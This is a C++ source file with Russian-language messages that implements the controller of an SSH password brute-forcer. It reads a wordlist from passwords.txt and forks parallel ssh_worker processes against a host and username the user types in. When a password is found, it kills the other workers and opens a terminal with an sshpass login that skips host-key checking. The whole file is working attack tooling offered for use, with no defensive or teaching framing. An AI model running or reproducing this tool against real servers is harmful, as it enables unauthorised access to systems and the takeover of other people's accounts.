#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <cstring>
#include <fcntl.h>

std::vector<pid_t> worker_pids;
std::vector<int> log_pipes;
std::string found_password = "";
std::mutex password_mutex;
std::atomic<bool> stopLogs(false);

void launchWorker(const std::string& hostname, const std::string& username, int start_index, int step) {
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("Ошибка создания пайпа");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);

        execl("./ssh_worker", "ssh_worker",
              hostname.c_str(),
              username.c_str(),
              std::to_string(start_index).c_str(),
              std::to_string(step).c_str(),
              nullptr);

        perror("[ERROR] Не удалось запустить ssh_worker");
        exit(1);
    } else if (pid > 0) {
        close(pipefd[1]);
        worker_pids.push_back(pid);
        log_pipes.push_back(pipefd[0]);
        std::cout << "[DEBUG] Запущен ssh_worker с PID: " << pid << std::endl;
    } else {
        std::cerr << "Ошибка fork()" << std::endl;
    }
}

void killAllWorkers(pid_t exclude_pid = -1) {
    std::cout << "Завершение всех ssh_worker процессов..." << std::endl;
    for (pid_t pid : worker_pids) {
        if (pid != exclude_pid) {
            std::cout << "Убийство процесса PID: " << pid << std::endl;
            kill(pid, SIGKILL);
        }
    }
}

void readLogs(std::atomic<bool>& stopLogs, std::atomic<int>& finishedWorkers) {
    constexpr size_t BUFFER_SIZE = 256;
    char buffer[BUFFER_SIZE];

    for (auto fd : log_pipes) {
        fcntl(fd, F_SETFL, O_NONBLOCK);
    }

    while (!stopLogs) {
        bool active = false;

        for (size_t i = 0; i < log_pipes.size(); ++i) {
            ssize_t count = read(log_pipes[i], buffer, BUFFER_SIZE - 1);
            if (count > 0) {
                active = true;
                buffer[count] = '\0';
                std::string output(buffer);

                std::cout << "[WORKER LOG] " << output;

                size_t pos = output.find("PASSWORD_FOUND:");
                if (pos != std::string::npos) {
                    std::string password = output.substr(pos + std::strlen("PASSWORD_FOUND:"));
                    {
                        std::lock_guard<std::mutex> lock(password_mutex);
                        found_password = password;
                    }
                    stopLogs = true;
                }
            }
        }

        for (auto it = worker_pids.begin(); it != worker_pids.end(); ) {
            int status;
            pid_t result = waitpid(*it, &status, WNOHANG);
            if (result > 0) {
                std::cout << "[INFO] Воркер PID " << *it << " завершился со статусом " << status << std::endl;
                it = worker_pids.erase(it);
                finishedWorkers++;
            } else {
                ++it;
            }
        }

        if (!active) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        if (finishedWorkers == log_pipes.size()) {
            std::cout << "[INFO] Все воркеры завершились." << std::endl;
            stopLogs = true;
        }
    }
}

std::string promptInput(const std::string& prompt) {
    std::string input;
    while (true) {
        std::cout << prompt;
        std::getline(std::cin, input);
        if (!input.empty()) {
            break;
        }
        std::cout << "[ERROR] Поле не может быть пустым. Повторите ввод.\n";
    }
    return input;
}

void launchInteractiveSession(const std::string& hostname, const std::string& username, const std::string& password) {
    std::string ssh_command = "sshpass -p '" + password + "' ssh -o StrictHostKeyChecking=no " + username + "@" + hostname;
    std::cout << "[INFO] Запускаю новую сессию с командой: " << ssh_command << std::endl;

    if (fork() == 0) {
        // Пытаемся запустить терминал. Пробуем несколько вариантов.
        execlp("xfce4-terminal", "xfce4-terminal", "--hold", "--command", ssh_command.c_str(), nullptr);
        execlp("gnome-terminal", "gnome-terminal", "--", "bash", "-c", ssh_command.c_str(), nullptr);
        execlp("xterm", "xterm", "-hold", "-e", ssh_command.c_str(), nullptr);
        perror("[ERROR] Не удалось запустить терминал с сессией");
        exit(1);
    }
}

void handleSuccessfulPassword(const std::string& hostname, const std::string& username, const std::string& password) {
    std::cout << "[INFO] Правильный пароль найден: " << password << std::endl;
    std::cout << "[INFO] Завершаю все процессы воркеров..." << std::endl;
    killAllWorkers();
    launchInteractiveSession(hostname, username, password);
}

int main() {
    std::cout << "=== SSH Брутфорс Контроллер ===\n\n";

    std::string hostname = promptInput("Введите IP-адрес или hostname сервера: ");
    std::string username = promptInput("Введите имя пользователя: ");

    std::cout << "\n[INFO] Цель: " << hostname << " | Пользователь: " << username << "\n";

    std::ifstream file("passwords.txt");
    if (!file) {
        std::cerr << "[ERROR] Не удалось открыть файл passwords.txt\n";
        return 1;
    }

    std::vector<std::string> passwords;
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) {
            passwords.push_back(line);
        }
    }
    file.close();

    if (passwords.empty()) {
        std::cerr << "[ERROR] Файл passwords.txt пуст!\n";
        return 1;
    }

    unsigned int cpu_cores = std::thread::hardware_concurrency();
    if (cpu_cores == 0) cpu_cores = 2;

    std::cout << "[INFO] Найдено паролей: " << passwords.size() << "\n";
    std::cout << "[INFO] Запуск " << cpu_cores << " воркеров для перебора паролей...\n\n";

    for (unsigned int i = 0; i < cpu_cores; ++i) {
        launchWorker(hostname, username, i, cpu_cores);
    }

    std::atomic<int> finishedWorkers(0);
    std::thread logThread(readLogs, std::ref(stopLogs), std::ref(finishedWorkers));

    logThread.join();

    if (!found_password.empty()) {
        handleSuccessfulPassword(hostname, username, found_password);
    } else {
        std::cout << "\nПароль не найден после завершения всех воркеров!" << std::endl;
        killAllWorkers();
    }

    std::cout << "[INFO] Работа контроллера завершена.\n";
    return 0;
}
